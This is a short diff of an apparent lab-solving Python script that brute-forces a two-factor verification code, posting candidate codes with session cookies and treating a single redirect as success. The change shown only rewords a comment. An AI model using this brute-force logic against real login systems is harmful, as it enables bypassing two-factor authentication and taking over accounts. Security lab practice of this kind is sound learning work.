@@ -15,8 +15,7 @@ def get_verification_code(username):
         response = requests.post(url, cookies=cookies, data=data, allow_redirects=True)
         print(response.history) 
 
-        '''The password will be valid if the username is "carlos" and the direction happened at least one time in the "history" list of the response during logging in so it will be succeeded.'''
-        
+        #The password will be valid if the redirection happened at least one time in the "history" list.
         if (len(response.history) == 1):
             print(colored(f"[+] Valid verification code found... ","green"))
             return code
